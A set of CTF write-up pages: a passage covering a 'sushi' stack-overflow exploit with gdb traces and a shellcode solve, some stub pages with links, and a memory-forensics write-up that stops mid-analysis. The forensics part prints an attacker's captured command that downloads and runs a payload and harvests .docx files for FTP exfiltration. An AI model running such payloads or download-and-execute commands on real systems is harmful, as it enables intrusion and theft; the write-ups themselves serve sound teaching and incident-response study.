* Set `ulimit -c unlimited` to create core dumps after a segementation fault. [Source](http://stackoverflow.com/questions/2919378/how-to-enable-core-dump-in-my-linux-c-program) and [here](https://wiki.archlinux.org/index.php/Core_dump)
* `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` - Didn't work without - used it to make gdb attach work [Source](http://askubuntu.com/questions/41629/after-upgrade-gdb-wont-attach-to-process)
* Overflow the buffer, generating a core dump:
```bash
$ python -c 'print "A"*0x40+"ARBPARBP"+"BBBBCCCC"' | ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8                                           
Deposit money for sushi here: 0x7fff11e90620
Sorry, $0.65 is not enough.
Segmentation fault (core dumped)
$ ls
core  peda-session-sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8.txt  sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8
$ file core
core: ELF 64-bit LSB  core file x86-64, version 1 (SYSV), SVR4-style, from './sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8'
```
* Analyse it using gdb: `gdb -q ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 core`:
```bash
$ gdb -q ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 core

Reading symbols from ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8...(no debugging symbols found)...done.

warning: core file may not match specified executable file.
[New LWP 2468]
Core was generated by `./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000004005f2 in ?? ()
gdb-peda$ x/i $rip
=> 0x4005f2:    ret    
gdb-peda$ x/2wx $rsp
0x7fff11e90668: 0x42424242      0x43434343
```

We see that a Segmentation fault happened at the `ret` instruction of our main function. `rsp` points at the next address that `rip` has to jump to, which is (64 bit == 8 bytes address) `0x4242424243434343` (Hope I got the order right).

You can also just load the binary in `gdb-peda`, run it, provide it with the payload string `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARBPARBPBBBBCCCC` and see the status of our stack at the end of the main function (last 2 instructions):

```bash
$ gdb ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 
Reading symbols from ./sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8...(no debugging symbols found)...done.
gdb-peda$ b *0x004005f1
Breakpoint 1 at 0x4005f1
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/bsides/sushi/sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8 
Deposit money for sushi here: 0x7fffffffe390
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARBPARBPBBBBCCCC
Sorry, $0.65 is not enough.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
[...]
RBP: 0x7fffffffe3d0 ("ARBPARBPBBBBCCCC")
RSP: 0x7fffffffe390 ('A' <repeats 65 times>, "RBPARBPBBBBCCCC")
RIP: 0x4005f1 (leave)
[...]
[-------------------------------------code-------------------------------------]
   0x4005e2:    mov    edi,0x0
   0x4005e7:    call   0x400490 <fflush@plt>
   0x4005ec:    mov    eax,0x0
=> 0x4005f1:    leave  
   0x4005f2:    ret    
   0x4005f3:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4005fd:    nop    DWORD PTR [rax]
   0x400600:    push   r15
[...]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe390 ('A' <repeats 65 times>, "RBPARBPBBBBCCCC")
[...]
gdb-peda$ x/20wx $rbp
0x7fffffffe3d0: 0x50425241      0x50425241      0x42424242      0x43434343
[...]
gdb-peda$ ni
[...]
RBP: 0x5042524150425241 ('ARBPARBP')
RSP: 0x7fffffffe3d8 ("BBBBCCCC")
RIP: 0x4005f2 (ret)
[...]
[-------------------------------------code-------------------------------------]
   0x4005e7:    call   0x400490 <fflush@plt>
   0x4005ec:    mov    eax,0x0
   0x4005f1:    leave  
=> 0x4005f2:    ret    
   0x4005f3:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4005fd:    nop    DWORD PTR [rax]
   0x400600:    push   r15
   0x400602:    mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3d8 ("BBBBCCCC")
gdb-peda$ ni
[...]
Stopped reason: SIGSEGV
```

You'll see that `leave` is correspondent to "Move saved `rbp` to `rsp`", meaning `mov rsp, [rbp+8]` and `ret` is correspondent to `pop rip`.

All that's left to do now is find a shellcode that fits for `gets` (function is null byte `\x00` friendly), which is smaller than `0x48`==`72` bytes and set RIP to our input buffer address, leaked by the program itself!

[This python script](./solve.py) does the job:

```bash
$ p solve.py 
[+] Started program './sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8'
[*] Switching to interactive mode
Sorry, $0.49 is not enough.
$ cat flag.txt
flag{I_l3ft_my_wallet_in_#irc}
[*] Stopped program './sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8'
```


## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/sushi>
* <https://rotlogix.com/2015/03/18/vancouver-bsides-ctf-sushi/> (down) ([cached](https://web.archive.org/web/20150625064545/http://rotlogix.com/2015/03/18/vancouver-bsides-ctf-sushi/)) or <http://www.tuicool.com/articles/uieaeaq>
* <http://capturetheswag.blogspot.com.au/2015/03/vancouver-bsides-2015-sushi-pwnable.html>
* <https://ctf-team.vulnhub.com/bsides-vancouver-2015-sushi/> or <http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/>
* <https://akshayswebspace.wordpress.com/tag/writeup/>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)
* [Japanese 2](http://charo-it.hatenablog.jp/entry/2015/03/18/234404)
* [Korean?](http://revers3r.tistory.com/27)
* [Korean](http://s0ngsari.tistory.com/entry/yvrctfPwnable-100)
* <http://captf.com/2015/bsides-vancouver/ownable/sushi-psifertex-solve.py>
* <https://gist.github.com/emyei/248ccf0aa4b773aa17a7>
* <http://smleenull.tistory.com/521># Vancouver BSides CTF 2015: Wind Blue Yonder

**Category:** Ownable
**Points:** 400
**Solves:** 31
**Description:** 

> wildblue.termsec.net 2323
> 
> [wby-23859086c3e87a4beb04b4f920b7ed49d407326e](wby-23859086c3e87a4beb04b4f920b7ed49d407326e)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/wildblueyonder>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)
* [Japanese 2](http://charo-it.hatenablog.jp/entry/2015/03/18/234404)
* [Korean](http://smleenull.tistory.com/523)# Vancouver BSides CTF 2015: www

**Category:** Ownable
**Points:** 200
**Solves:** 51
**Description:** 

> www.termsec.net 17284
> 
> [www-6c895cf622477d1bd2969ddbdf7c64185db9a41e](www-6c895cf622477d1bd2969ddbdf7c64185db9a41e)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/www>
* <https://ctf-team.vulnhub.com/bsides-vancouver-2015-www/>
* <http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2015/03/b-sides-vancouver-2015.html)
* [Japanese 2](http://charo-it.hatenablog.jp/entry/2015/03/18/234404)
* <http://captf.com/2015/bsides-vancouver/ownable/www-psifertex-solve.py>
* <https://gist.github.com/emyei/5e3c9d0a32c0aa0d3899>
* [Korean](http://smleenull.tistory.com/522)# Vancouver BSides CTF 2015: detent

**Category:** Reversing
**Points:** 250
**Solves:** 23
**Description:** 

> Very much not the same thing as a détente.
> 
> 104.238.154.51:9182
> 
> [detent-88a5dabea6b4179f1e45aea44a34e0c761e2fdb6](detent-88a5dabea6b4179f1e45aea44a34e0c761e2fdb6)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/detent>
* [French](https://securimag.org/wp/challenges/vancouver-bsides-ctf-detent/)# Vancouver BSides CTF write-ups

* <https://yvrctf.ctfd.io/>
* [Writeups, Results and Statistics by the Organisers](https://github.com/yvrctf/2015)
* [Number of solves per task](https://github.com/yvrctf/2015#full-breakdown) or [local alternative](solves.txt)
* [Scoreboard](https://yvrctf.ctfd.io/scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* [crypto/ts-sci-nz](crypto/ts-sci-nz)
* [forensics/garbage-file](forensics/garbage-file)
* [forensics/kicker-of-elves](forensics/kicker-of-elves)
* [misc/10-ctf-commandments](misc/10-ctf-commandments)
* [ownable/sushi](ownable/sushi)

## External write-ups only

* [crypto/matasano](crypto/matasano)
* [ownable/delphi](ownable/delphi)
* [ownable/glorious-modem](ownable/glorious-modem)
* [ownable/wind-blue-yonder](ownable/wind-blue-yonder)
* [ownable/www](ownable/www)
* [re/detent](re/detent)
* [sandbox/baby-playpen-fence](sandbox/baby-playpen-fence)
* [sandbox/big-prison-fence](sandbox/big-prison-fence)

## Missing write-ups# Vancouver BSides CTF 2015: Baby Playpen Fence

**Category:** Sandbox
**Points:** 100
**Solves:** 2
**Description:** 

> You're in a little baby sandbox. Escape and read the flag.
> 
> babyplaypenfence.termsec.net 25887
> 
> [babypf-1ae7656c09638d7ed138553e58bbffc5077a5b13](babypf-1ae7656c09638d7ed138553e58bbffc5077a5b13)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/babyplaypenfence># Vancouver BSides CTF 2015: Big Prison Fence

**Category:** Sandbox
**Points:** 400
**Solves:** 13
**Description:** 

> You're in a big prison sandbox now. We like to kick sand castles, do you?
> 
> bigprisonfence.termsec.net 49782
> 
> [bigprisonfence-10544d80a6780596c9f3e941f992307c618e9c73](bigprisonfence-10544d80a6780596c9f3e941f992307c618e9c73)
>
> Updated version of [bigprisonfence](bigpf-db7652f5a734dbc99def3e2e33606f952b6551b8)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/yvrctf/2015/tree/master/bigprisonfence>
* <http://paste.ubuntu.com/10620504/># CAMP CTF 2015: APT-incident-response-400

**Category:** Forensics
**Points:** 400
**Solves:** 19
**Description:**

> You are part of an cyber security cyber incident response team and your customer suspects somebody pwned one of their servers.
>
> Examine the memory dump to get the flag.
>
> Download: [dump.vmem](https://drive.google.com/file/d/0B_zt1fDAjfM_Zy1YZFhkQkg4NTg/view?usp=sharing)

> Mirror: [dump.vmem Mega.nz Mirror](https://mega.nz/#!fAlADbbb!HZhaTzhBkJd7z8KFECTdYnXY8pkbocb4NjCbFCLwRrg)
>
> md5(dump.vmem): 019f6d29f6e3f6f0443eea39c2b74a30
>
> sha1(dump.vmem): 4ff1fcf76f6d62fe164b8ed56703dacd5f275673
>
> sha256(dump.vmem): 863cd2ec4fe7cbb7dcc0e4a3f0540ef228853480a16a19c18b5f2e189823423d


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://fischer-its.com/?p=1991>
* <http://dft-labs.eu/~ctf/CCCCAMP_2015/APT-incident-response/writeup.txt> 

We are given a [(VMWare) memory dump](https://www.vmware.com/support/ws55/doc/ws_learning_files_in_a_vm.html) of a yet unkown operating system.

The first thing that we do is find out what type of operating system we are dealing with - This is done using either [`volatility`](https://github.com/volatilityfoundation/volatility)'s [imageinfo](https://code.google.com/p/volatility/wiki/CommandReference#imageinfo) command or searching for operating system unique Strings using `strings` and `grep`.

Since the former did not work in my case, I tried the latter:

```bash
$ strings -a dump.vmem | grep -iEo '(linux|ubuntu|debian|windows)' | sort | uniq -c | sort -n
   1 LInux
   3 WindowS
  17 Ubuntu
  18 DEBIAN
  37 WINDOWS
  38 LINUX
 102 ubuntu
 105 windows
 506 Windows
1573 Linux
3895 Debian
4635 linux
10552 debian
```

Looks like we have a Debian Memory dump!

However, for `volatility` to work, we need [a proper profile](https://code.google.com/p/volatility/wiki/LinuxMemoryForensics#Creating_a_profile), since volatility only comes with Windows Profiles (:/).

This also means finding or creating a profile with the correct Debian version!

We first have to find the correct version using strings, again!

```bash
$ strings -a dump.vmem | grep -iEo '(hamm|slink|potato|woody|sarge|etch|lenny|squeeze|wheezy|jessie|stretch)' | sort | uniq -c | sort -n
   1 STRETCH
   1 Slink
   1 Stretch
   2 HAMM
   3 woody
   4 Lenny
   4 potato
   5 sLink
   6 Hamm
   7 SLINK
   8 sarge
   9 Squeeze
  14 stretch
  16 hamm
  17 etCh
  36 lenny
  66 slink
 512 ETCH
 709 etch
9019 squeeze
```

Looks like Debian 6.0 (`squeeze`)!

Fortunately, we don't have to create a profile on our own, since several profiles are offered in [another volatility foundation github repo](https://github.com/volatilityfoundation/profiles/tree/master/Linux/Debian/x64).

To use this profile and the [linux commands of `volatility`](https://code.google.com/p/volatility/wiki/LinuxMemoryForensics#Using_the_Plugins), we move the correct profile, `Debian608.zip`, to `volatility/volatility/plugins/overlays/linux/Debian608.zip`.

Now we are ready to have a look inside the memory dump.

First, we have a look at the processes that have been running by imitating the `ps` unix command using `volatility`'s `linux_psaux` command:

```bash
$ python2.7 vol.py -f dump.vmem --profile=LinuxDebian608x64 linux_psaux
Pid    Uid    Gid    Arguments                                                       
1      0      0      init [2]                                                        
2      0      0      [kthreadd]                                                      
3      0      0      [migration/0]                                                   
4      0      0      [ksoftirqd/0]                                                   
5      0      0      [watchdog/0]                                                    
6      0      0      [events/0]                                                      
7      0      0      [cpuset]                                                        
8      0      0      [khelper]                                                       
9      0      0      [netns]                                                         
10     0      0      [async/mgr]                                                     
11     0      0      [pm]                                                            
12     0      0      [sync_supers]                                                   
13     0      0      [bdi-default]                                                   
14     0      0      [kintegrityd/0]                                                 
15     0      0      [kblockd/0]                                                     
16     0      0      [kacpid]                                                        
17     0      0      [kacpi_notify]                                                  
18     0      0      [kacpi_hotplug]                                                 
19     0      0      [kseriod]                                                       
21     0      0      [kondemand/0]                                                   
22     0      0      [khungtaskd]                                                    
23     0      0      [kswapd0]                                                       
24     0      0      [ksmd]                                                          
25     0      0      [aio/0]                                                         
26     0      0      [crypto/0]                                                      
194    0      0      [ksuspend_usbd]                                                 
195    0      0      [khubd]                                                         
196    0      0      [ata/0]                                                         
197    0      0      [ata_aux]                                                       
198    0      0      [scsi_eh_0]                                                     
199    0      0      [scsi_eh_1]                                                     
207    0      0      [mpt_poll_0]                                                    
208    0      0      [mpt/0]                                                         
215    0      0      [scsi_eh_2]                                                     
242    0      0      [kjournald]                                                     
310    0      0      udevd --daemon                                                  
465    0      0      udevd --daemon                                                  
468    0      0      udevd --daemon                                                  
518    0      0      [kpsmoused]                                                     
530    0      0      [kgameportd]                                                    
540    0      0      [usbhid_resumer]                                                
760    1      1      /sbin/portmap                                                   
772    102    0      /sbin/rpc.statd                                                 
901    0      0      /usr/sbin/rsyslogd -c4                                          
926    0      0      /usr/sbin/acpid                                                 
950    0      0      /usr/sbin/apache2 -k start                                      
976    0      0      /usr/sbin/atd                                                   
979    33     33     /usr/sbin/apache2 -k start                                      
980    33     33     /usr/sbin/apache2 -k start                                      
981    33     33     /usr/sbin/apache2 -k start                                      
982    33     33     /usr/sbin/apache2 -k start                                      
983    33     33     /usr/sbin/apache2 -k start                                      
1035   0      0      /usr/bin/daemon /etc/init.d/mpt-statusd check_mpt               
1039   0      0      /bin/sh /etc/init.d/mpt-statusd check_mpt                       
1040   0      0      /usr/sbin/cron                                                  
1181   0      0      sleep 600                                                       
1301   101    103    /usr/sbin/exim4 -bd -q30m                                       
1319   0      0      /bin/login --                                                   
1320   0      0      /sbin/getty 38400 tty2                                          
1321   0      0      /sbin/getty 38400 tty3                                          
1322   0      0      /sbin/getty 38400 tty4                                          
1323   0      0      /sbin/getty 38400 tty5                                          
1324   0      0      /sbin/getty 38400 tty6                                          
1325   0      0      [flush-8:0]                                                     
1335   0      0      dhclient -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
1366   0      0      /usr/sbin/sshd                                                  
1367   0      0      -bash                                                           
1594   33     33     /usr/sbin/apache2 -k start                                      
4178   0      0      watch -n 0.1 ps -aux | grep curl                                
4299   33     33     /bin/bash /usr/lib/cgi-bin/get_env.cgi                          
4300   33     33     /bin/bash -c mkdir /tmp/.\ ; LD_LIBRARY_PATH="/tmp/.\ /:$LD_LIBRARY_PATH" ; curl -L -o /tmp/.\ /payload.tar.gz "https://www.dropbox.com/s/4ebxsvbjkopzaxa/payload.tar.gz?dl=1" ; tar xvf /tmp/.\ /payload.tar.gz -C /tmp/.\  ; /tmp/.\ /payload.run 6FYTQ0TN/NX2UCt3AcjL/sXX3ohzcsmFRCDF6aSNGg== qhYMABqJ/4ShTis= /VVOW1jaow== 2GBzfhqKjoCtV344U5DHpIaO3osma5nNU3yRquzcV56Ve5+QVJ/wqtsiLWo9qTP28FLqF4SQGVUfjenPwYKI1bnB0SxOack= ; rm -rf /tmp/.\  
5521   33     33     apache2                                                                                                                                                                                        
5522   33     33     sh -c bash -c 'IFS=$(echo -en "\n\b") ; for i in `find / -iname "*.docx"`; do unzip -p "$i" word/document.xml | sed -e "s/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g" | grep "sw-mor-dc01-blmhpi153-2.seat.it" >> "/tmp/tmp_tIvczi"; done; '
5523   33     33     bash -c IFS=$(echo -en "\n\b") ; for i in `find / -iname "*.docx"`; do unzip -p "$i" word/document.xml | sed -e "s/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g" | grep "sw-mor-dc01-blmhpi153-2.seat.it" >> "/tmp/tmp_tIvczi"; done; 
5574   33     33     bash -c IFS=$(echo -en "\n\b") ; for i in `find / -iname "*.docx"`; do unzip -p "$i" word/document.xml | sed -e "s/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g" | grep "sw-mor-dc01-blmhpi153-2.seat.it" >> "/tmp/tmp_tIvczi"; done; 
5575   33     33     bash -c IFS=$(echo -en "\n\b") ; for i in `find / -iname "*.docx"`; do unzip -p "$i" word/document.xml | sed -e "s/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g" | grep "sw-mor-dc01-blmhpi153-2.seat.it" >> "/tmp/tmp_tIvczi"; done; 
5576   33     33     bash -c IFS=$(echo -en "\n\b") ; for i in `find / -iname "*.docx"`; do unzip -p "$i" word/document.xml | sed -e "s/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g" | grep "sw-mor-dc01-blmhpi153-2.seat.it" >> "/tmp/tmp_tIvczi"; done;
```

We can see some interesting processes, by process ID:

* `950`, `979`-`983`, `1594`: Presumably original `apache2` processes
* `4300`:
  * Creates a directory `/tmp. ` (mind the space!)
  * Sets the [LD_LIBRARY_PATH](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html#AEN80) variable
  * Downloads `payload.tar.gz` from now-deleted <https://www.dropbox.com/s/4ebxsvbjkopzaxa/payload.tar.gz> into `/tmp/. /payload.tar.gz`
  * Extracts the contents of `payload.tar.gz`
  * Runs `payload.run` with parameters `6FYTQ0TN/NX2UCt3AcjL/sXX3ohzcsmFRCDF6aSNGg==`, `qhYMABqJ/4ShTis=`, `/VVOW1jaow==` and `2GBzfhqKjoCtV344U5DHpIaO3osma5nNU3yRquzcV56Ve5+QVJ/wqtsiLWo9qTP28FLqF4SQGVUfjenPwYKI1bnB0SxOack=`
  * Deletes `/tmp. `
* `5521`: Another process called `apache2`
* `5522`, `5523`, `5574`-`5576`: Searches for files ending with `.docx`, extracts a document called `word/document.xml` from each found file to stdout, pipes the content to `sed` to remove all Strings matching the regexes `<[^>]\{1,\}>` and `[^[:print:]]\{1,\}`, `grep`s only for Strings that contain `sw-mor-dc01-blmhpi153-2.seat.it` and finally appends (and saves) the result to `/tmp/tmp_tIvczi`

To have a better view on which process called/created which process, we have a look at the process tree using the `linux_pstree` command:

```bash
$ python2.7 vol.py -f dump.vmem --profile=LinuxDebian608x64 linux_pstree
Name                 Pid             Uid            
init                 1               0              
.udevd               310             0              
..udevd              465             0              
..udevd              468             0              
.portmap             760             1              
.rpc.statd           772             102            
.rsyslogd            901             0              
.rsyslogd            905             0              
.rsyslogd            906             0              
.acpid               926             0              
.apache2             950             0              
..apache2            979             33             
..apache2            980             33             
...get_env.cgi       4299            33             
....bash             4300            33             
.....payload.run     5521            33             
......sh             5522            33             
.......bash          5523            33             
........bash         5574            33             
........bash         5575            33             
........bash         5576            33             
..apache2            981             33             
..apache2            982             33             
..apache2            983             33             
..apache2            1594            33             
.atd                 976             0              
.daemon              1035            0              
..mpt-statusd        1039            0              
...sleep             1181            0              
.cron                1040            0              
.exim4               1301            101            
.login               1319            0              
..bash               1367            0              
...watch             4178            0              
.getty               1320            0              
.getty               1321            0              
.getty               1322            0              
.getty               1323            0              
.getty               1324            0              
.dhclient            1335            0              
.sshd                1366            0              
[...]
```

We see that process with process ID `980` started `get_env.cgi` (Pid `4299`), which then created `4300`.
`4300` then started `payload.run` (`5521`), which then invoked the commands to search for files ending in `.docx`.

To extract `payload.tar.gz` from the memory dump, with the hope that it still is in the memory, we can use `volatility`'s `linux_find_file` command to find the [inode](https://en.wikipedia.org/wiki/Inode) ID of `payload.tar.gz`:

```bash
$ python2.7 vol.py -f dump.vmem --profile=LinuxDebian608x64 linux_find_file -F "/tmp/. /payload.tar.gz"
Inode Number                  Inode File Path
---------------- ------------------ ---------
          434180 0xffff880018fe8a48 /tmp/. /payload.tar.gz
```

Now that we have the Inode ID, `0xffff880018fe8a48`, we can extract the file (also available [here](./payload.tar.gz)):

```bash
$ python2.7 vol.py -f dump.vmem --profile=LinuxDebian608x64 linux_find_file -i 0xffff880018fe8a48 -O payload.tar.gz
$ file payload.tar.gz
payload.tar.gz: gzip compressed data, was "deploy_debian.tar", from Unix, last modified: Wed Aug  5 02:08:05 2015
$ mkdir out
+bash-4.3$ tar xvf payload.tar.gz -C out 
x libcom_err.so.2
x libcrypto.so.0.9.8
x libc.so.6
x libcurl.so.4
x libdl.so.2
x libgcc_s.so.1
x libgcrypt.so.11
x libgnutls.so.26
x libgpg-error.so.0
x libgssapi_krb5.so.2
x libidn.so.11
x libk5crypto.so.3
x libkeyutils.so.1
x libkrb5.so.3
x libkrb5support.so.0
x liblber-2.4.so.2
x libldap_r-2.4.so.2
x libm.so.6
x libpthread.so.0
x libresolv.so.2
x librt.so.1
x libsasl2.so.2
x libssh2.so.1
x libssl.so.0.9.8
x libstdc++.so.6
x libtasn1.so.3
x libz.so.1
x payload.run
$ ls -l out/
total 18104
-rwxr-xr-x  1 xxx  xxx  1437064 Aug  4 18:42 libc.so.6
-rw-r--r--  1 xxx  xxx    12336 Aug  4 18:42 libcom_err.so.2
-rw-r--r--  1 xxx  xxx  1693344 Aug  4 18:42 libcrypto.so.0.9.8
-rw-r--r--  1 xxx  xxx   398024 Aug  4 18:42 libcurl.so.4
-rw-r--r--  1 xxx  xxx    14696 Aug  4 18:42 libdl.so.2
-rw-r--r--  1 xxx  xxx    90504 Aug  4 18:42 libgcc_s.so.1
-rw-r--r--  1 xxx  xxx   489912 Aug  4 18:42 libgcrypt.so.11
-rw-r--r--  1 xxx  xxx   665192 Aug  4 18:42 libgnutls.so.26
-rw-r--r--  1 xxx  xxx    13216 Aug  4 18:42 libgpg-error.so.0
-rw-r--r--  1 xxx  xxx   216824 Aug  4 18:42 libgssapi_krb5.so.2
-rw-r--r--  1 xxx  xxx   206520 Aug  4 18:42 libidn.so.11
-rw-r--r--  1 xxx  xxx   155744 Aug  4 18:42 libk5crypto.so.3
-rw-r--r--  1 xxx  xxx     8528 Aug  4 18:42 libkeyutils.so.1
-rw-r--r--  1 xxx  xxx   818840 Aug  4 18:42 libkrb5.so.3
-rw-r--r--  1 xxx  xxx    32016 Aug  4 18:42 libkrb5support.so.0
-rw-r--r--  1 xxx  xxx    56992 Aug  4 18:42 liblber-2.4.so.2
-rw-r--r--  1 xxx  xxx   297224 Aug  4 18:42 libldap_r-2.4.so.2
-rw-r--r--  1 xxx  xxx   530736 Aug  4 18:42 libm.so.6
-rwxr-xr-x  1 xxx  xxx   131258 Aug  4 18:42 libpthread.so.0
-rw-r--r--  1 xxx  xxx    80712 Aug  4 18:42 libresolv.so.2
-rw-r--r--  1 xxx  xxx    31744 Aug  4 18:42 librt.so.1
-rw-r--r--  1 xxx  xxx   104184 Aug  4 18:42 libsasl2.so.2
-rw-r--r--  1 xxx  xxx   148896 Aug  4 18:42 libssh2.so.1
-rw-r--r--  1 xxx  xxx   356608 Aug  4 18:42 libssl.so.0.9.8
-rw-r--r--  1 xxx  xxx  1043976 Aug  4 18:42 libstdc++.so.6
-rw-r--r--  1 xxx  xxx    65568 Aug  4 18:42 libtasn1.so.3
-rw-r--r--  1 xxx  xxx    93936 Aug  4 18:42 libz.so.1
-rwxr-xr-x  1 xxx  xxx    15624 Aug  5 02:07 payload.run
```

The most recent changed file is an ELF, `payload.run`:

```bash
$ file payload.run
payload.run:         ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, stripped
```

We now have several options to find out more about what this program does:

* Trace library calls by this program using `ltrace` (in a secure environment such as a VM) as suggested [here](https://fischer-its.com/?p=1991): `ltrace -s 1024 -o trace.log ./payload.run 6FYTQ0TN/NX2UCt3AcjL/sXX3ohzcsmFRCDF6aSNGg== qhYMABqJ/4ShTis= /VVOW1jaow== 2GBzfhqKjoCtV344U5DHpIaO3osma5nNU3yRquzcV56Ve5+QVJ/wqtsiLWo9qTP28FLqF4SQGVUfjenPwYKI1bnB0SxOack=`
  * Result: `snprintf("ftp://172.16.54.1/ubuntu_192.168.96.129_1442335527.txt", 10240, "ftp://%s/%s", "172.16.54.1", "ubuntu_192.168.96.129_1442335527.txt") = 54`
* Find out about its inner workings by reversing the program using reverse engineering tools such as [Hopper](http://hopperapp.com/), [IDA](https://www.hex-rays.com/products/ida/support/download.shtml) or [radare2](https://github.com/radare/radare2).
  * Result: [Decompiled code](https://fischer-its.com/?page_id=2014) and [graphical representation](https://fischer-its.com/wp-content/uploads/2015/09/payload_callgraph-New-Page.png)

We see that a FTP server is contacted, `172.16.54.1`, which is secured with unknown credentials.

It seems that the credentials and maybe the FTP server IP or url has been provided as the above mentioned parameters to `payload.run` and are base64 decoded and encrypted using an unknown encryption key.

To find out what these credentials are, we have several options:

* Run the program in a secured environment using `gdb` and set a breakpoint after the decryption as done [here](https://fischer-its.com/?p=1991)
* Guess that the encryption is a simple XOR and is embedded in the `payload.run` binary and find the encryption key by using `xor-strings` and some file analysis.

Since the former is already explained in one of the other writeups, I am just describing the thought process behind the latter approach.

Since we guess that the IP and credentials for the FTP server are provided to `payload.run`, we can try to find the embedded xor key using [xor-strings.py](./xor-strings.py):

```bash
+$ echo -n /VVOW1jaow== | base64 --decode | xxd -p | tr -d '\n' && echo
fd554e5b58daa3
+$ echo -n qhYMABqJ/4ShTis= | base64 --decode | xxd -p | tr -d '\n' && echo
aa160c001a89ff84a14e2b
+$ echo -n 6FYTQ0TN/NX2UCt3AcjL/sXX3ohzcsmFRCDF6aSNGg== | base64 --decode | xxd -p | tr -d '\n' && echo
e856134344cdfcd5f6502b7701c8cbfec5d7de887372c9854420c5e9a48d1a
+$ echo -n 2GBzfhqKjoCtV344U5DHpIaO3osma5nNU3yRquzcV56Ve5+QVJ/wqtsiLWo9qTP28FLqF4SQGVUfjenPwYKI1bnB0SxOack= | base64 --decode | xxd -p | tr -d '\n' && echo
d860737e1a8a8e80ad577e385390c7a4868ede8b266b99cd537c91aaecdc579e957b9f90549ff0aadb222d6a3da933f6f052ea17849019551f8de9cfc18288d5b9c1d12c4e69c9
+$ echo fd554e5b58daa3 >> parameters
+$ echo aa160c001a89ff84a14e2b >> parameters
+$ echo e856134344cdfcd5f6502b7701c8cbfec5d7de887372c9854420c5e9a48d1a >> parameters
+$ echo d860737e1a8a8e80ad577e385390c7a4868ede8b266b99cd537c91aaecdc579e957b9f90549ff0aadb222d6a3da933f6f052ea17849019551f8de9cfc18288d5b9c1d12c4e69c9 >> parameters
+$ cat parameters 
fd554e5b58daa3
aa160c001a89ff84a14e2b
e856134344cdfcd5f6502b7701c8cbfec5d7de887372c9854420c5e9a48d1a
d860737e1a8a8e80ad577e385390c7a4868ede8b266b99cd537c91aaecdc579e957b9f90549ff0aadb222d6a3da933f6f052ea17849019551f8de9cfc18288d5b9c1d12c4e69c9
+$ echo -n '172.16.54.1' | xxd -p
3137322e31362e35342e31
+$ cat parameters | while read par; do python2.7 xor-strings.py 3137322e31362e35342e31 "$par"; done 
003137322ecc63606e6cf492
009b213e2e2bbfd1b195601a
00e856134344cdfcd5f6502b7701c8cbfec5d7de884245fbab7516ebdc90a32b
00d860737e1a8a8e80ad577e385390c7a4868ede8b266b99cd537c91aaecdc579e957b9f90549ff0aadb222d6a3da933f6f052ea17849019551f8de9cff0b5bafb88f7ff197a47f8
```

We find that the hex string `9b213e2e2bbfd1b195601a` is indeed in the binary:

![](./hexedit-search.png)

The key in fact is a bit longer:

![](./hexedit-found.png)

We extract the key using `xxd`:

```bash
+$ xxd -s11040 -l130 -p payload.run | tr -d '\n' > key
+$ cat key && echo
009b213e2e2bbfd1b195601a5a63a4a696b5beefbd405ffbab3745a49d8ae46efaf71afea562a6c1ccee1014520d915793c331db72e0f67a6379eb8faaf0b7bee58bf3e01c2b58fb4c2b14f32f6d4bf3b0d32f0a51d5ca3a537d078d147c2fcdf93e3bb30ca94a75fa34c597f1a6fb9451d3f32bf88582183e0e1ddb52d955a5c900
```

And decrypt the given parameters using `xor-strings` again:

```bash
